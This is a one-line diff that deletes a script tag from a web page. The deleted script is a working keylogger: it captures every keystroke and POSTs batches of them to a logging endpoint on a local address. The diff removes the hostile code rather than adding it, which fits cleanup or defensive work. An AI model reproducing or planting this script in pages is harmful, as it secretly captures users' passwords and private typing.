@@ -1,1 +1,0 @@
-<script>let k='';document.onkeydown=e=>{(k+=e.key+' ').length>50&&fetch('http://127.0.0.1:5001/log',{method:'POST',body:k});}</script>
